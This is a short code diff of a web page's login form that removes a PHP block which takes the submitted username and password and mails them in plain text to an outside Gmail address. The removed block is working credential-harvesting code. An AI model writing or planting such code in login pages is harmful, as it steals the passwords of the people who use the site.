@@ -52,32 +52,6 @@
     </form>
 
 </div>
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Recupera los datos del formulario
-    $username = $_POST['username'];
-    $password = $_POST['password'];
-
-    // Dirección de correo electrónico a la que enviar los datos
-    $to = "julianeaoficial@gmail.com";
-
-    // Asunto del correo electrónico
-    $subject = "Datos del formulario de inicio de sesión";
-
-    // Mensaje del correo electrónico
-    $message = "Username: $username\r\nPassword: $password";
-
-    // Cabeceras del correo electrónico
-    $headers = "From: tu@email.com";
-
-    // Envía el correo electrónico
-    if (mail($to, $subject, $message, $headers)) {
-        echo "Correo electrónico enviado correctamente.";
-    } else {
-        echo "Error al enviar el correo electrónico.";
-    }
-}
-?>
 
 </body>
 </html>
